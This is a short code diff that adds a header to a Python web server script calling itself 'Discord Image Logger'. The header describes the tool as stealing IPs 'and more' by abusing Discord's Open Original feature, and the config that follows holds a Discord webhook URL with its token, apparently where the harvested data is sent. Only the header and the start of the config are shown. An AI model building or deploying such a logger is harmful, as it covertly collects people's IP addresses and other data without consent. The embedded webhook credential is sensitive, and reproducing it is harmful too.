@@ -2,6 +2,11 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
+__app__ = "Discord Image Logger"
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__version__ = "v2.0"
+__author__ = "DeKrypt"
+
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1334896819486064731/R-XCnpl-3E-z45-sblLeG1l9D-A1HKt2f1LPB0iy9Rghe2Ow3uS27XEeB8-7ZB_OR6Px",
